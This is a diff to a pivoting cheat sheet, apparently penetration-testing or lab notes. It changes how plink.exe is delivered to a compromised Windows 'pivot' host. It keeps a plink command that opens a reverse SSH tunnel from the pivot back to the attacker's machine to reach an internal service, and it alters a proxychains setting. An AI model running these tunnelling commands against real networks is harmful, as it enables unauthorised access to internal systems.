@@ -24,8 +24,11 @@ Kali's proxychains points at Tor's port; this makes it use the proxy instead:
 sudo sed -i 's/^socks4.*9050$/socks5 127.0.0.1 1080/' /etc/proxychains4.conf
 
 ## plink
-Kali ships it. Into the target's upload/ folder, then fetched with the line serve files prints:
-cp /usr/share/windows-resources/binaries/plink.exe THE-UPLOAD-FOLDER/
+At the pwn-broker prompt:
+tool install plink
+serve
+serve files plink
+- [ ] plink.exe fetched on the pivot with the line serve files gives; plink32.exe on 32-bit Windows
 On the pivot, an internal service on a Kali port. The echo answers the host key question:
 cmd.exe /c echo y | .\plink.exe -ssh -l tunnel -pw THE-TUNNEL-PASSWORD -N -R 127.0.0.1:<LPORT>:<InternalIP>:<Port> <LHOST>
 The pivot's own RDP:
